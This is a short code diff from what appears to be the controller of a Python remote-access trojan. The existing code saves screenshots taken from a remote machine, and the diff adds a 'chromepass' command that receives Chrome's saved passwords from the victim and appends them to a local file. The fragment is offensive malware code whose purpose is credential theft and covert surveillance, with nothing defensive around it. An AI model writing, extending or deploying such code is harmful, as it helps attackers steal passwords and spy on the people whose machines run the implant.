@@ -30,7 +30,12 @@ if(s.recv(BUFFER_SIZE).decode()) == "auth":
                 if not os.path.exists('screenshots'):
                     os.makedirs('screenshots')
                 with open(f"./screenshots/{filename}", 'wb') as f:
-                    f.write(imgdata)    
+                    f.write(imgdata) 
+            elif cmd.lower() == "chromepass":    
+                   chromepass = s.recv(BUFFER_SIZE).decode()
+                   if chromepass != "null":
+                        with open("chromepass.txt","a+") as f:
+                                f.write(chromepass)
             output = s.recv(BUFFER_SIZE).decode()
             cwd = output.split(SEPARATOR)[0]
             if output.split(SEPARATOR)[1] == "exiting...":
